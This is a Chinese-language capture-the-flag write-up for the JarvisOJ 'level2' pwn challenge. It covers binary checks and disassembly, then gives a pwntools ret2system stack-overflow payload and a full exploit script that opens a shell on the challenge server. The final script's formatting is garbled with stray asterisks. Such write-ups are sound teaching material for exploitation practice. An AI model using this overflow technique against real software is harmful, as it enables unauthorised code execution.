# JarvisOJ-PWN-Level2

## 0x01 文件检查
```shell
file level2 
```

![](README/CAAF3C8D-B257-430E-8EE4-F74598BCF416.png)

32位文件

```shell
checksec level2
```

![](README/6215D5AA-3598-4435-B0FD-E2C0E3516762.png)

开了NX保护
不过系统好像提供了shell脚本

## 0x02 反汇编

![](README/B8D9A190-6DBC-49F9-BFCF-3CA89EB178B1.png)

main函数调用了vulnerable_function函数
![](README/6FD18404-1A22-4A5E-9F42-17802C034A99.png)

开辟的缓冲区大小是0x88h,再加上ebp 的0x4h就跳到了返回地址了，然后就是去找system函数的地址,无论是main函数还是vulnerable_function函数都是通过call _system的方式调用system
![](README/0D263C07-70EF-4446-803B-A2549914EA65.png)


system的函数有了，然后就是调用的参数解释器了_bin_sh，shift+F12搜一下
![](README/AF702029-9070-44F1-A3C8-9C11F1541139.png)
地址是0x0804A024
当然也可以用pwntools直接从elf中提取
```python
from pwn import *
elf = ELF('./level2')
sys_addr = elf.symbols['system']
sh_addr = elf.search('/bin/sh').next()
```

栈的结构图
![](README/7797EB63-22A1-4207-87B5-670D07D3E2A0.png)

那么payload就是
```
payload = "a"*(0x88+0x4)+p32(0x0804849E)+p32(0x0804A024)
```


最后的全代码就是
```
*from*pwn *import**

conn = remote(*'pwn2.jarvisoj.com'*,9878)
conn.recvline()
payload = *"a"**(0x88+0x4)+p32(0x0804849E)+p32(0x0804A024)

conn.send(payload)

conn.interactive()


```








